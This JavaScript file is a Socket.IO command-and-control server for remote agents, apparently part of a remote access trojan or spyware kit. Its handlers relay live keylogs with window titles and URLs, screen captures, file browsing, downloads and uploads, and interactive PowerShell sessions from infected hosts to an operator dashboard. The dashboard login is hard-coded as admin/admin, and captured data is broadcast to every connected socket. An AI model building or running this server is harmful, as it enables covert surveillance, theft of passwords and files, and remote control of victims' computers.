const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 50 * 1024 * 1024
});

// --- Users store (username -> { password }) ---
const users = new Map([
  ['admin', { password: 'admin' }]
]);

// --- Sessions (token -> username) ---
const sessions = new Map();

function requireAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token || !sessions.has(token)) return res.status(401).json({ error: 'Não autorizado' });
  req.sessionUser = sessions.get(token);
  next();
}

// Store connected agents
const agents = new Map();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'dashboard', 'public')));

// --- Auth ---
app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  const user = users.get(username);
  if (!user || user.password !== password)
    return res.status(401).json({ error: 'Credenciais inválidas' });
  const token = crypto.randomBytes(24).toString('hex');
  sessions.set(token, username);
  res.json({ token, username });
});

app.post('/api/logout', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (token) sessions.delete(token);
  res.json({ ok: true });
});

// --- User management ---
app.get('/api/users', requireAuth, (req, res) => {
  res.json([...users.keys()].map(u => ({ username: u })));
});

app.post('/api/users', requireAuth, (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password)
    return res.status(400).json({ error: 'Usuário e senha são obrigatórios' });
  if (users.has(username))
    return res.status(409).json({ error: 'Usuário já existe' });
  users.set(username, { password });
  res.json({ ok: true });
});

app.put('/api/users/:username', requireAuth, (req, res) => {
  const { username } = req.params;
  const { password } = req.body || {};
  if (!users.has(username))
    return res.status(404).json({ error: 'Usuário não encontrado' });
  if (!password)
    return res.status(400).json({ error: 'Senha é obrigatória' });
  users.get(username).password = password;
  res.json({ ok: true });
});

app.delete('/api/users/:username', requireAuth, (req, res) => {
  const { username } = req.params;
  if (!users.has(username))
    return res.status(404).json({ error: 'Usuário não encontrado' });
  if (users.size === 1)
    return res.status(400).json({ error: 'Não é possível remover o único usuário' });
  // Invalidate sessions of deleted user
  for (const [tok, u] of sessions) { if (u === username) sessions.delete(tok); }
  users.delete(username);
  res.json({ ok: true });
});

// --- Agents list ---
app.get('/api/agents', requireAuth, (req, res) => {
  const list = [];
  for (const [id, a] of agents)
    list.push({ ...a.info, lastSeen: a.lastSeen, online: true });
  res.json(list);
});

// --- Socket.IO middleware ---
io.use((socket, next) => {
  const token = socket.handshake.auth?.token;
  if (token && sessions.has(token)) socket.isDashboard = true;
  next();
});

function toAll(event, data) { io.emit(event, data); }
function toAgent(clientId, event, data) {
  const a = agents.get(clientId);
  if (a) a.socket.emit(event, data);
}

io.on('connection', (socket) => {
  socket.on('agent:register', ({ clientId, hostname, os, ip }) => {
    socket.isAgent = true;
    agents.set(clientId, { socket, info: { clientId, hostname, os, ip }, lastSeen: Date.now() });
    toAll('agent:online', { clientId, hostname, os, ip });
    console.log(`Agent: ${clientId} (${hostname})`);
  });

  socket.on('agent:heartbeat', ({ clientId }) => {
    const a = agents.get(clientId); if (a) a.lastSeen = Date.now();
  });

  socket.on('agent:screen',     d => toAll('client:screen', d));
  socket.on('agent:keylog',     ({ clientId, text, windowTitle, windowUrl, timestamp }) =>
    toAll('client:keylog', { clientId, text, windowTitle, windowUrl,
      timestamp: timestamp ? timestamp * 1000 : Date.now() }));
  socket.on('agent:files',      d => toAll('client:files', d));
  socket.on('agent:file:chunk', d => toAll('client:file:chunk', d));
  socket.on('agent:upload:done',d => toAll('client:upload:done', d));
  socket.on('agent:ps:output',   ({ clientId, sessionId, output, isErr }) =>
    toAll('client:ps:output', { clientId, sessionId, output, isErr }));
  socket.on('agent:ps:complete', d => toAll('client:ps:complete', d));

  const guard = fn => (d) => { if (!socket.isDashboard) return; fn(d); };
  socket.on('dash:request:screen',       guard(d => toAgent(d.clientId, 'cmd:screen', d)));
  socket.on('dash:request:keylog:stream',guard(d => toAgent(d.clientId, 'cmd:keylog:stream', d)));
  socket.on('dash:request:keylog:stop',  guard(d => toAgent(d.clientId, 'cmd:keylog:stop', d)));
  socket.on('dash:request:files',        guard(d => toAgent(d.clientId, 'cmd:files', d)));
  socket.on('dash:request:download',     guard(d => toAgent(d.clientId, 'cmd:download', d)));
  socket.on('dash:request:upload',       guard(d => toAgent(d.clientId, 'cmd:upload', d)));
  socket.on('dash:ps:open',              guard(d => toAgent(d.clientId, 'cmd:ps:open', d)));
  socket.on('dash:ps:input',             guard(d => toAgent(d.clientId, 'cmd:ps:input', d)));
  socket.on('dash:ps:close',             guard(d => toAgent(d.clientId, 'cmd:ps:close', d)));
  socket.on('dash:ps:complete',          guard(d => toAgent(d.clientId, 'cmd:ps:complete', d)));

  socket.on('disconnect', () => {
    for (const [id, a] of agents) {
      if (a.socket === socket) {
        agents.delete(id); io.emit('agent:offline', { clientId: id });
        console.log(`Agent offline: ${id}`); break;
      }
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server on port ${PORT}`));
